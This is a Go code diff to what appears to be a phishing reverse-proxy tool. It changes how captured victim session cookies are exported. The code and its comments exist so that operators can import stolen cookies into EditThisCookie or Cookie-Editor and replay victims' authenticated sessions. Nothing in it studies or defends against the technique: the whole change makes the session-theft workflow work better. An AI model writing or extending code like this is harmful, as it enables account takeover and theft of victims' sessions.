@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/url"
+	"strings"
 	"sync"
 	"time"
 
@@ -366,11 +367,30 @@ func (s *Store) notify(result Result, event, message, tokens string) error {
 	return conn.WriteMessage(websocket.TextMessage, data)
 }
 
+// cookieTokensJSON serializes captured cookies for the dashboard export. The
+// field names and JSON tags mirror pkg/proxy/core/terminal.go's
+// cookieTokensToJSON (the terminal's own cookie export) exactly, because
+// EditThisCookie and Cookie-Editor -- the tools operators use to replay a
+// captured session -- require lowercase keys (path, domain, name, value,
+// expirationDate, httpOnly, hostOnly, secure). Go's default field-name
+// marshalling produced capitalized keys neither tool recognizes, so the
+// dashboard export could not be imported at all.
+//
+// sameSite is intentionally omitted: database.CookieToken never retains the
+// attribute the proxy assigns when rewriting Set-Cookie (see the
+// SameSite=None rewrite in http_proxy.go), so there is no genuine value to
+// emit here -- inventing a default would be exactly the kind of false data
+// this fix is meant to remove.
 func cookieTokensJSON(tokens map[string]map[string]*database.CookieToken) string {
 	type cookie struct {
-		Path, Domain, Value, Name string
-		ExpirationDate            int64
-		HttpOnly, HostOnly        bool
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
 	}
 	cookies := make([]cookie, 0)
 	for domain, values := range tokens {
@@ -386,7 +406,11 @@ func cookieTokensJSON(tokens map[string]map[string]*database.CookieToken) string
 			if path == "" {
 				path = "/"
 			}
-			cookies = append(cookies, cookie{Path: path, Domain: domain, ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(), Value: token.Value, Name: name, HttpOnly: token.HttpOnly, HostOnly: hostOnly})
+			c := cookie{Path: path, Domain: domain, ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(), Value: token.Value, Name: name, HttpOnly: token.HttpOnly, HostOnly: hostOnly}
+			if strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-") {
+				c.Secure = true
+			}
+			cookies = append(cookies, c)
 		}
 	}
 	data, _ := json.Marshal(cookies)
